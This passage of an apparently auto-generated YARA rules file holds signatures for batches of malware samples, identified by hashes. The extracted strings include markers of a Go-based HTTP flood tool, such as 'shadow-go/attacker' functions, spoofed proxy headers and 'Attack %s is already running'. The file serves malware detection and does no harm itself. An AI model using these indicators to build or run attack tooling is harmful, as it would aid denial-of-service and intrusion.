      description = "_subset_batch - from files 27ac6e0b23c27dbcd34d1f47a5139e4a503573557d0dcfb550ffcc5d4d642682_27ac6e0b.unknown, 5ef16927424d3a1772afd5f9de585b4c7e42e51d6254b8da007a1b51de967d63_5ef16927.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "27ac6e0b23c27dbcd34d1f47a5139e4a503573557d0dcfb550ffcc5d4d642682"
      hash2 = "5ef16927424d3a1772afd5f9de585b4c7e42e51d6254b8da007a1b51de967d63"
   strings:
      $x1 = "kernel32.dll,VirtualProtect,GetSystemInfo,HeapAlloc,GetProcessHeap,VirtualAlloc,VirtualFree,HeapFree,Fuck" fullword ascii /* score: '40.00'*/
      $s2 = "*\\G{00025E01-0000-0000-C000-000000000046}#5.0#0#C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\DAO\\dao360.dll#Micros" wide /* score: '28.00'*/
      $s3 = "kernel32.dll,VirtualProtect,GetSystemInfo,HeapAlloc" fullword wide /* score: '27.00'*/
      $s4 = "*\\G{00000201-0000-0010-8000-00AA006D2EA4}#2.1#0#C:\\Program Files (x86)\\Common Files\\System\\ado\\msado21.tlb#Microsoft Activ" wide /* score: '19.00'*/
      $s5 = "bAutoLogin" fullword wide /* score: '15.00'*/
      $s6 = "VVVVVVVT " fullword wide /* base64 encoded string 'UUUUUS' */ /* score: '14.00'*/
      $s7 = "60.dll#" fullword ascii /* score: '13.00'*/
      $s8 = "*\\G{4AFFC9A0-5F99-101B-AF4E-00AA003F0F07}#9.0#0#C:\\Program Files (x86)\\Microsoft Office\\Office12\\MSACC.OLB#Microsoft Access" wide /* score: '13.00'*/
      $s9 = "subinfo" fullword wide /* score: '11.00'*/
      $s10 = ">>>22222220 " fullword wide /* score: '9.00'*/ /* hex encoded string '""" ' */
      $s11 = "@@@44444442 " fullword wide /* score: '9.00'*/ /* hex encoded string 'DDDB' */
      $s12 = "students" fullword wide /* score: '8.00'*/
      $s13 = "colinfo" fullword wide /* score: '8.00'*/
      $s14 = "makeupinfo" fullword wide /* score: '8.00'*/
      $s15 = "teaminfo" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x0100 and filesize < 4000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _416aff537cf06107cccfcbff2b142e2f92d23f7aacc51c0e19a66b92b0797fe7_416aff53_7de5b038c5ce3d401bf2c8c38ddf7d71dd3af0018a66fe9bc_26 {
   meta:
      description = "_subset_batch - from files 416aff537cf06107cccfcbff2b142e2f92d23f7aacc51c0e19a66b92b0797fe7_416aff53.elf, 7de5b038c5ce3d401bf2c8c38ddf7d71dd3af0018a66fe9bc71a35f912e21c02_7de5b038.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "416aff537cf06107cccfcbff2b142e2f92d23f7aacc51c0e19a66b92b0797fe7"
      hash2 = "7de5b038c5ce3d401bf2c8c38ddf7d71dd3af0018a66fe9bc71a35f912e21c02"
   strings:
      $x1 = "stopTheWorld: not stopped (status != _Pgcstop)select on synctest channel from outside bubbleruntime: name offset base pointer ou" ascii /* score: '75.50'*/
      $x2 = "/cpu/classes/idle:cpu-seconds/cpu/classes/user:cpu-seconds/gc/heap/allocs-by-size:bytes/gc/stack/starting-size:bytesgc done but " ascii /* score: '75.50'*/
      $x3 = "span set block with unpopped elements found in resetcasfrom_Gscanstatus: gp->status is not in scan stateerrors: *target must be " ascii /* score: '64.50'*/
      $x4 = ", locked to threadOpera Software ASAX-Forwarded-ServerX-Akamai-EdgescapeSec-Ch-Ua-Platformshadow-go-attackerinput/output errorno" ascii /* score: '42.00'*/
      $x5 = "mix of request and response pseudo headersPRIORITY frame payload size was %d; want 5http: ContentLength=%d with Body length %dpe" ascii /* score: '38.50'*/
      $x6 = "mix of request and response pseudo headersPRIORITY frame payload size was %d; want 5http: ContentLength=%d with Body length %dpe" ascii /* score: '36.50'*/
      $x7 = "socks bindProcessingNo Content%s|%s%s|%s/dev/stdinreaddirent (deleted)pidfd_openpidfd_waitexecerrdotnotifyListprofInsertstackLar" ascii /* score: '33.00'*/
      $x8 = "tyleopera.com/by=%s%s.%snginxenvoy%s,%sWin32:443/deny" fullword ascii /* score: '31.50'*/
      $s9 = " child processesidentifier removedno locks availableRFS specific errormultihop attemptedfile name too longstreams pipe erroroper" ascii /* score: '28.00'*/
      $s10 = "nationrecursive call during initialization - linker skewattempt to execute system stack code on user stackANGLE (Intel HD Graphi" ascii /* score: '28.00'*/
      $s11 = "not map pages in arena address spaceruntime: malformed profBuf buffer - invalid sizeattempt to trace invalid or unsupported P st" ascii /* score: '25.00'*/
      $s12 = "_eofunknown error unknown code: Not Acceptable (core dumped)/proc/self/exeuserArenaStateGC (dedicated)read mem statsasynctimerch" ascii /* score: '23.00'*/
      $s13 = "undle.pemx509: invalid RDNSequence: invalid attribute typex509: Ed25519 key encoded with illegal parameterschacha20poly1305: bad" ascii /* score: '22.00'*/
      $s14 = "untime: work.nwait = runtime:scanstack: gp=scanstack - bad statusheadTailIndex overflowruntime.main not on m0set_crosscall2 miss" ascii /* score: '21.00'*/
      $s15 = "RCodeFormatErrorunpacking headerContent-Languageinvalid encodingempty hex numberlength too large[bisect-match 0xCloseCurlyQuote;" ascii /* score: '20.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 24000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _1dbc7738d8ad1e6b79048c0e4a9066ae_imphash__2ffcc53d165f90cad66a29a16bea365d_imphash__56e695fc_6d4ab1032f66fc4fe8d72b1c468e14_27 {
   meta:
      description = "_subset_batch - from files 1dbc7738d8ad1e6b79048c0e4a9066ae(imphash).exe, 2ffcc53d165f90cad66a29a16bea365d(imphash)_56e695fc.exe, 6d4ab1032f66fc4fe8d72b1c468e1469(imphash).exe, 799e73863806df2964d80d12ce4e61ea(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "fb488e45a6338697d70301557cad14b110880f6838023b44d0125759123c4449"
      hash2 = "56e695fc1a6295569036a0777d81b5d572962a82d6d4a5209741ff957337c8e3"
      hash3 = "ecb3a597d17244e2fadec4590a6b492f362095ffc5eb6ee58624be766c69fc82"
      hash4 = "9bab404584f6a0d9d82112d6e017cfa37d0094d97e510101d6a0132fd145dd32"
   strings:
      $s1 = "icuuc.dll" fullword wide /* score: '23.00'*/
      $s2 = "icuin.dll" fullword wide /* score: '23.00'*/
      $s3 = "TryGetHashCode" fullword ascii /* score: '12.00'*/
      $s4 = "ConfigLogFile" fullword ascii /* score: '12.00'*/
      $s5 = "CommittedUsage" fullword ascii /* score: '12.00'*/
      $s6 = "u_getVersion%s" fullword ascii /* score: '12.00'*/
      $s7 = "ures_getByKey%s" fullword ascii /* score: '12.00'*/
      $s8 = "GCConfigLogEnabled" fullword ascii /* score: '12.00'*/
      $s9 = "ulocdata_getCLDRVersion%s" fullword ascii /* score: '12.00'*/
      $s10 = "The resolved version \"%s\" from System.Globalization.AppLocalIcu switch has to be < %zu chars long." fullword ascii /* score: '12.00'*/
      $s11 = "ConfigLogEnabled" fullword ascii /* score: '12.00'*/
      $s12 = "ucol_getVersion%s" fullword ascii /* score: '12.00'*/
      $s13 = "ucol_getSortKey%s" fullword ascii /* score: '12.00'*/
      $s14 = "ulocdata_getMeasurementSystem%s" fullword ascii /* score: '12.00'*/
      $s15 = "uloc_getKeywordValue%s" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 29000KB and ( 8 of them )
      ) or ( all of them )
}

rule _36bf2503a88c8d7798a0751ff12f0126dd48db205109aa42a2b7129317a627ed_36bf2503_44c6fbea46ea8d2b1c42d2a77c1af1a64bbc465318ee46edd_28 {
   meta:
      description = "_subset_batch - from files 36bf2503a88c8d7798a0751ff12f0126dd48db205109aa42a2b7129317a627ed_36bf2503.elf, 44c6fbea46ea8d2b1c42d2a77c1af1a64bbc465318ee46edd1322bfe9ee91c48_44c6fbea.elf, 6c5348ed0a55e1c69b6ce05a34879033ae04807f92211eb1fb959b207bb32506_6c5348ed.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "36bf2503a88c8d7798a0751ff12f0126dd48db205109aa42a2b7129317a627ed"
      hash2 = "44c6fbea46ea8d2b1c42d2a77c1af1a64bbc465318ee46edd1322bfe9ee91c48"
      hash3 = "6c5348ed0a55e1c69b6ce05a34879033ae04807f92211eb1fb959b207bb32506"
   strings:
      $s1 = "vendor/golang.org/x/sys/cpu.processOptions" fullword ascii /* score: '18.00'*/
      $s2 = "runtime.getAuxv" fullword ascii /* score: '15.00'*/
      $s3 = "omitempt" fullword ascii /* score: '15.00'*/
      $s4 = "Command(H" fullword ascii /* score: '12.00'*/
      $s5 = "math.archLog" fullword ascii /* score: '12.00'*/
      $s6 = "vendor/golang.org/x/sys/cpu.xgetbv" fullword ascii /* score: '12.00'*/
      $s7 = "time.DatH" fullword ascii /* score: '11.00'*/
      $s8 = "runtime.(*sigctxt).rbp" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.(*sigctxt).rdi" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.sigpanic0" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.(*sigctxt).rbx" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.(*sigctxt).rip" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.(*sigctxt).rsi" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.(*sigctxt).rcx" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.(*sigctxt).rax" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 21000KB and ( 8 of them )
      ) or ( all of them )
}

rule _00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d_00b1ee6c_0512719a1f878b3611b03d100a854910_imphash__37d3842_29 {
   meta:
      description = "_subset_batch - from files 00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d_00b1ee6c.elf, 0512719a1f878b3611b03d100a854910(imphash).exe, 37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857_37d38427.elf, 3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a4a2b29afb6bff08_3ad87cc8.elf, 416aff537cf06107cccfcbff2b142e2f92d23f7aacc51c0e19a66b92b0797fe7_416aff53.elf, 6c5348ed0a55e1c69b6ce05a34879033ae04807f92211eb1fb959b207bb32506_6c5348ed.elf, 6d5f17d7b00a92e39881ac506210c7d6725c92db86942a931e711fb1aede4ce7_6d5f17d7.elf, 7de5b038c5ce3d401bf2c8c38ddf7d71dd3af0018a66fe9bc71a35f912e21c02_7de5b038.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d"
      hash2 = "418ec7ea2b11e518fea98992db9c087d4a38df8b4e9c52b55045d7cd0abdd9ac"
      hash3 = "37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857"
      hash4 = "3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a4a2b29afb6bff08"
      hash5 = "416aff537cf06107cccfcbff2b142e2f92d23f7aacc51c0e19a66b92b0797fe7"
      hash6 = "6c5348ed0a55e1c69b6ce05a34879033ae04807f92211eb1fb959b207bb32506"
      hash7 = "6d5f17d7b00a92e39881ac506210c7d6725c92db86942a931e711fb1aede4ce7"
      hash8 = "7de5b038c5ce3d401bf2c8c38ddf7d71dd3af0018a66fe9bc71a35f912e21c02"
   strings:
      $s1 = "doExecute" fullword ascii /* score: '18.00'*/
      $s2 = "regexp.(*Regexp).doExecute" fullword ascii /* score: '18.00'*/
      $s3 = "regexp.compileOnePass" fullword ascii /* score: '17.00'*/
      $s4 = "log.(*Logger).Output" fullword ascii /* score: '14.00'*/
      $s5 = "log.(*Logger).Printf" fullword ascii /* score: '14.00'*/
      $s6 = "regexp.Compile" fullword ascii /* score: '14.00'*/
      $s7 = "regexp/syntax.dumpInst" fullword ascii /* score: '14.00'*/
      $s8 = "regexp/syntax.dumpProg" fullword ascii /* score: '14.00'*/
      $s9 = "regexp.compile" fullword ascii /* score: '14.00'*/
      $s10 = "regexp.(*Regexp).get" fullword ascii /* score: '12.00'*/
      $s11 = "*runtime.traceBufHeader" fullword ascii /* score: '12.00'*/
      $s12 = "net.(*Resolver).lookupHost" fullword ascii /* score: '12.00'*/
      $s13 = "net.(*Resolver).LookupHost" fullword ascii /* score: '12.00'*/
      $s14 = "regexp/syntax.Compile" fullword ascii /* score: '11.00'*/
      $s15 = "onepass" fullword ascii /* score: '11.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 24000KB and pe.imphash() == "0512719a1f878b3611b03d100a854910" and ( 8 of them )
      ) or ( all of them )
}

rule _442cd635b0ae873bc92537f6f6554791_imphash__442cd635b0ae873bc92537f6f6554791_imphash__3ff6ed9e_442cd635b0ae873bc92537f6f65547_30 {
   meta:
      description = "_subset_batch - from files 442cd635b0ae873bc92537f6f6554791(imphash).exe, 442cd635b0ae873bc92537f6f6554791(imphash)_3ff6ed9e.exe, 442cd635b0ae873bc92537f6f6554791(imphash)_4e4ffa0c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "759354ddf0c7d84ad357cade9d0adbf2e88f46b3fe20b46fa2959da1adec91ba"
      hash2 = "3ff6ed9eca4b208f9cf9a921557f8b8a0846e9b914b61c1d6fe5256b0dce7a1f"
      hash3 = "4e4ffa0c292cde161a4249659a2d523610e8a83696b07e72a4dc72b6dd23ca7b"
   strings:
      $s1 = "[i] Privilege %s not present in token (ok)." fullword wide /* score: '14.00'*/
      $s2 = "shell32 (SHGetKnownFolderPath/SHBrowseForFolder/IShellLink)," fullword wide /* score: '14.00'*/
      $s3 = "EventLog hotkeys started" fullword wide /* score: '12.00'*/
      $s4 = "Operations complete." fullword wide /* score: '12.00'*/
      $s5 = "advapi32 (registry), and comctl32 (TaskDialog/InitCommonControls)." fullword wide /* score: '12.00'*/
      $s6 = "%s\\Exing.txt" fullword wide /* score: '11.00'*/
      $s7 = "%s\\Exing Shortcut.lnk" fullword wide /* score: '11.00'*/
      $s8 = "<read failed>" fullword wide /* score: '10.00'*/
      $s9 = "[OK] Privilege %s enabled." fullword wide /* score: '10.00'*/
      $s10 = "It exercises kernel32 (CreateFile/WriteFile)," fullword wide /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 15000KB and pe.imphash() == "442cd635b0ae873bc92537f6f6554791" and ( all of them )
      ) or ( all of them )
}

rule _00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d_00b1ee6c_6c5348ed0a55e1c69b6ce05a34879033ae04807f92211eb1f_31 {
   meta:
      description = "_subset_batch - from files 00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d_00b1ee6c.elf, 6c5348ed0a55e1c69b6ce05a34879033ae04807f92211eb1fb959b207bb32506_6c5348ed.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d"
      hash2 = "6c5348ed0a55e1c69b6ce05a34879033ae04807f92211eb1fb959b207bb32506"
   strings:
      $x1 = "lock: sleeping while lock is availableP has cached GC work at end of mark terminationfailed to acquire lock to start a GC transi" ascii /* score: '70.50'*/
      $x2 = "5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296" ascii /* score: '66.50'*/
      $x3 = "stop of synctest timer from outside bubbletraceStopReadCPU called with trace enabledattempted to trace a bad status for a procTi" ascii /* score: '64.50'*/
      $x4 = "crypto/rand: failed to read random data (see https://go.dev/issue/66821): tls: certificate RSA key size too small for supported " ascii /* score: '56.50'*/
      $x5 = "DetECDSA P-256 SHA2-512 signasn1: string not valid UTF-8invalid P224Element encodinginvalid P384Element encodinginvalid P521Elem" ascii /* score: '32.00'*/
      $s6 = "in counterrecursive call during initialization - linker skewattempt to execute system stack code on user stackANGLE (Intel HD Gr" ascii /* score: '28.00'*/
      $s7 = "ng DialDualStackhttps://raw.githubusercontent.com/EDDYCJY/fake-useragent/v0.2.0/static/tls: server's certificate contains an uns" ascii /* score: '26.00'*/
      $s8 = "p-Client-IP1.1 %s-proxy-%d_ga=GA1.2.%d.%d_fbp=fb.1.%d.%dhttp2multiplex:X-Shadow-Clientno such processadvertise errornetwork is d" ascii /* score: '23.50'*/
      $s9 = "o broken pipeSIGPWR: power failure restartexecuting on Go runtime stackruntime: mmap: access denied" fullword ascii /* score: '21.00'*/
      $s10 = " %p received error from processing frame %v: %vhttp2: Transport received unsolicited DATA frame; closing connectionhttp: message" ascii /* score: '20.50'*/
      $s11 = "tps://checkip.amazonaws.comAttack %s is already running.crypto/aes: invalid key size unknown certificate authoritytls: too many " ascii /* score: '19.00'*/
      $s12 = "ed a session ticket with invalid lifetimehttp2: Transport readFrame error on conn %p: (%T) %vprotocol error: received DATA befor" ascii /* score: '18.50'*/
      $s13 = "s maximum of %d byteshttp2: Transport closing idle conn %p (forSingleUse=%v, maxStream=%v)runtime.Pinner: found leaking pinned p" ascii /* score: '18.50'*/
      $s14 = "sia/ShanghaiNative Clientgzip, deflateAT&T Mobilityhttps://%s:%sX-Remote-AddrX-Incap-Proxy1.1 %s.%s.comvisitor_id=%slevel 3 rese" ascii /* score: '18.50'*/
      $s15 = " trying to unmarshal %q into %vexec: command with a non-nil Cancel was not created with CommandContextrange function recovered a" ascii /* score: '18.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 21000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _114a06bc7a709853310ac249873a5ebe23678da39e3a0cb55a6767969c23b95a_114a06bc_6f379be821a922f8998d9000437c22339174f131d7958ca5e_32 {
   meta:
      description = "_subset_batch - from files 114a06bc7a709853310ac249873a5ebe23678da39e3a0cb55a6767969c23b95a_114a06bc.elf, 6f379be821a922f8998d9000437c22339174f131d7958ca5ec878a8c0831beed_6f379be8.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "114a06bc7a709853310ac249873a5ebe23678da39e3a0cb55a6767969c23b95a"
      hash2 = "6f379be821a922f8998d9000437c22339174f131d7958ca5ec878a8c0831beed"
   strings:
      $s1 = "xgethostbyname" fullword ascii /* score: '18.00'*/
      $s2 = "bb_default_login_shell" fullword ascii /* score: '17.00'*/
      $s3 = "get_kernel_revision" fullword ascii /* score: '14.00'*/
      $s4 = "xgetcwd" fullword ascii /* score: '13.00'*/
      $s5 = "bb_lookup_host" fullword ascii /* score: '12.00'*/
      $s6 = "bb_get_last_path_component" fullword ascii /* score: '12.00'*/
      $s7 = "bb_process_escape_sequence" fullword ascii /* score: '11.00'*/
      $s8 = "cmdedit_read_input" fullword ascii /* score: '10.00'*/
      $s9 = "bb_xgetularg_bnd" fullword ascii /* score: '9.00'*/
      $s10 = "my_getpwuid" fullword ascii /* score: '9.00'*/
      $s11 = "bb_xgetularg_bnd_sfx" fullword ascii /* score: '9.00'*/
      $s12 = "bb_xgetlarg" fullword ascii /* score: '9.00'*/
      $s13 = "usage_messages" fullword ascii /* score: '9.00'*/
      $s14 = "tftp_main" fullword ascii /* score: '9.00'*/
      $s15 = "__fgetc_unlocked" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d_00b1ee6c_37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f27_33 {
   meta:
      description = "_subset_batch - from files 00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d_00b1ee6c.elf, 37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857_37d38427.elf, 3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a4a2b29afb6bff08_3ad87cc8.elf, 416aff537cf06107cccfcbff2b142e2f92d23f7aacc51c0e19a66b92b0797fe7_416aff53.elf, 6d5f17d7b00a92e39881ac506210c7d6725c92db86942a931e711fb1aede4ce7_6d5f17d7.elf, 7de5b038c5ce3d401bf2c8c38ddf7d71dd3af0018a66fe9bc71a35f912e21c02_7de5b038.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d"
      hash2 = "37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857"
      hash3 = "3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a4a2b29afb6bff08"
      hash4 = "416aff537cf06107cccfcbff2b142e2f92d23f7aacc51c0e19a66b92b0797fe7"
      hash5 = "6d5f17d7b00a92e39881ac506210c7d6725c92db86942a931e711fb1aede4ce7"
      hash6 = "7de5b038c5ce3d401bf2c8c38ddf7d71dd3af0018a66fe9bc71a35f912e21c02"
   strings:
      $x1 = "illegal base64 data at input byte in \\u hexadecimal character escapeexpected comma after array elementflag provided but not def" ascii /* score: '64.50'*/
      $x2 = "ed begin/end of activeSweepmheap.freeSpanLocked - invalid freefailed to get or create weak handleattempt to clear non-empty span" ascii /* score: '32.00'*/
      $x3 = "hemeread_frame_unexpected_eofhttp: invalid Host headerport number out of range invalid username/passwordnet/url: invalid userinf" ascii /* score: '31.00'*/
      $s4 = "bad value for field/usr/lib/locale/TZ/Canadian_AboriginalKhitan_Small_Script14901161193847656257450580596923828125unknown hash v" ascii /* score: '30.00'*/
      $s5 = "key %qfake_useragent_%s.jsonfileCache.Read err: %vsha3: Write after Readzero length BIT STRINGunexpected length codeCloseCurlyDo" ascii /* score: '26.00'*/
      $s6 = "invalid Trailer key already registeredProxy-Authorizationunknown status codeinvalid URL escape missing ']' in hostexec: cancelin" ascii /* score: '25.00'*/
      $s7 = "o/proc/sys/kernel/hostnamegoroutine profile cleanupchansend: spurious wakeup when attempting to open runtime" fullword ascii /* score: '24.00'*/
      $s8 = "host unreachableAlready ReportedMultiple ChoicesPayment RequiredUpgrade RequiredContent-Length: 0123456789ABCDEFexec: no command" ascii /* score: '24.00'*/
      $s9 = "ookie namehttp2: Request.URI is nilhttp2: Framer %p: read %vframe_data_pad_byte_shortframe_settings_has_streamframe_headers_zero" ascii /* score: '23.50'*/
      $s10 = "unknown address typeRequest URI Too LongUnprocessable EntityInsufficient Storagefloating point errorGC sweep terminationResetDeb" ascii /* score: '23.00'*/
      $s11 = "invalid timer: fake time but no syncgroupclone(CLONE_PIDFD) failed to return pidfdtime: Reset called on uninitialized Timertime:" ascii /* score: '21.50'*/
      $s12 = "shadow-go/attacker.setSpoofHeadersHTTP" fullword ascii /* score: '20.00'*/
      $s13 = "os/exec.Command(exec: killing Cmdexec: not startedgoroutine profileAllThreadsSyscallGC assist markingselect (no cases)sync.RWMut" ascii /* score: '20.00'*/
      $s14 = "flect.Value.Complexsingle-request-reopenparsenetlinkrouteattrhttp: nil Request.URLUNKNOWN_FRAME_TYPE_%dframe_ping_has_streamRoun" ascii /* score: '20.00'*/
      $s15 = "indefinite length found (not DER)struct contains unexported fieldsleafCounts[maxBits][maxBits] != nscalar has high bit set illeg" ascii /* score: '20.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 24000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857_37d38427_3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a_34 {
   meta:
      description = "_subset_batch - from files 37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857_37d38427.elf, 3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a4a2b29afb6bff08_3ad87cc8.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857"
      hash2 = "3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a4a2b29afb6bff08"
   strings:
      $x1 = "unsafe.String: len out of range.lib section in a.out corruptedcannot assign requested addressmalformed time zone informationcryp" ascii /* score: '76.50'*/
      $x2 = "lock: lock countbad system huge page sizearena already initialized to unused region of spanunaligned sysNoHugePageOS/sched/gomax" ascii /* score: '61.50'*/
      $x3 = "tls: internal error: sending non-handshake message to QUIC transportcrypto/hmac: hash generation function does not produce uniqu" ascii /* score: '51.50'*/
      $x4 = "5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296" ascii /* score: '49.50'*/
      $x5 = "crypto/ecdsa: use of custom curves is not allowed in FIPS 140-only modex509: issuer has name constraints but leaf doesn't have a" ascii /* score: '40.00'*/
      $x6 = "runtime: morestack on g0, stack [runtime: castogscanstatus oldval=stoplockedm: inconsistent lockingfindrunnable: negative nmspin" ascii /* score: '40.00'*/
      $x7 = "crypto/rand: failed to read random data (see https://go.dev/issue/66821): tls: certificate RSA key size too small for supported " ascii /* score: '38.50'*/
      $x8 = "MapIter.Next called on an iterator that does not have an associated map Valuerange function continued iteration after function f" ascii /* score: '37.00'*/
      $x9 = "socks bindProcessingNo Content%s|%s%s|%s/dev/stdinreaddirent (deleted)pidfd_openpidfd_waitexecerrdotnotifyListprofInsertstackLar" ascii /* score: '33.00'*/
      $x10 = ".com/EDDYCJY/fake-useragent/v0.2.0/static/tls: server's certificate contains an unsupported type of public key: %Truntime.Goexit" ascii /* score: '32.00'*/
      $s11 = "tinvalid request :path %qread_frame_conn_error_%sRequest Entity Too Largehttp: nil Request.Headerexec: Stdout already settracech" ascii /* score: '27.00'*/
      $s12 = "system huge page size (runtime: s.allocCount= s.allocCount > s.nelems/gc/heap/allocs:objectsmissing type in runfinqruntime: inte" ascii /* score: '24.00'*/
      $s13 = "evaluefloat  -%s(nil)Errorlinuxfileshttpsimap2imap3imapspop3shostsclose&amp;&#34;&#39;:***@Rangerange:pathHTTP1%s %q%s=%sHTTP/so" ascii /* score: '23.00'*/
      $s14 = "_eofunknown error unknown code: Not Acceptable (core dumped)/proc/self/exe" fullword ascii /* score: '21.00'*/
      $s15 = " beginning of a header blockcouldn't find DNS entries for the given domain. Try using DialDualStackhttps://raw.githubusercontent" ascii /* score: '20.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 21000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857_37d38427_3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a_35 {
   meta:
      description = "_subset_batch - from files 37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857_37d38427.elf, 3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a4a2b29afb6bff08_3ad87cc8.elf, 416aff537cf06107cccfcbff2b142e2f92d23f7aacc51c0e19a66b92b0797fe7_416aff53.elf, 6d5f17d7b00a92e39881ac506210c7d6725c92db86942a931e711fb1aede4ce7_6d5f17d7.elf, 7de5b038c5ce3d401bf2c8c38ddf7d71dd3af0018a66fe9bc71a35f912e21c02_7de5b038.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857"
      hash2 = "3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a4a2b29afb6bff08"
      hash3 = "416aff537cf06107cccfcbff2b142e2f92d23f7aacc51c0e19a66b92b0797fe7"
      hash4 = "6d5f17d7b00a92e39881ac506210c7d6725c92db86942a931e711fb1aede4ce7"
      hash5 = "7de5b038c5ce3d401bf2c8c38ddf7d71dd3af0018a66fe9bc71a35f912e21c02"
   strings:
      $x1 = "morebuf={pc:: no frame (sp=runtime: frame ts set in timertraceback stuckruntime.gopanicunexpected kindX-Cache-ControlX-Custom-He" ascii /* score: '36.50'*/
      $x2 = "DetECDSA P-256 SHA2-512 signasn1: string not valid UTF-8invalid P224Element encodinginvalid P256Element encodinginvalid P384Elem" ascii /* score: '32.00'*/
      $s3 = " runqueue= stopwait= runqsize= gfreecnt= throwing= spinning=atomicand8float64nanfloat32nan ptrSize=  targetpc= until pc=active <" ascii /* score: '29.00'*/
      $s4 = "es, but wanted to match https://developers.whatismybrowser.com/useragents/explore/%s/%s/%dcrypto/cipher: invalid buffer overlap " ascii /* score: '28.00'*/
      $s5 = "ntime: traceback stuck. pc=tried to trace dead goroutineruntime: impossible type kindfailed to resolve host %s: %v%s?_=%d&r=%d&t" ascii /* score: '24.50'*/
      $s6 = "p2roundRobinWriteSchedulerhttps://checkip.amazonaws.comAttack %s is already running.crypto/aes: invalid key size unknown certifi" ascii /* score: '23.00'*/
      $s7 = "e heap dumpasyncpreemptoffforce gc (idle)sync.Mutex.Lockruntime.Goschedmalloc deadlockruntime error: scan missed a gmisaligned m" ascii /* score: '22.00'*/
      $s8 = "thviewTargetzoomAndPanxlink:hrefxlink:rolexlink:showxlink:typefirst-linelast-childmatchesownonly-child[%s%s%s%s]:%s(%dn%s)[:^aln" ascii /* score: '21.00'*/
      $s9 = "hSHA1ECDSAWithSHA1key expansionmaster secretCLIENT_RANDOMUsage of %s:" fullword ascii /* score: '20.50'*/
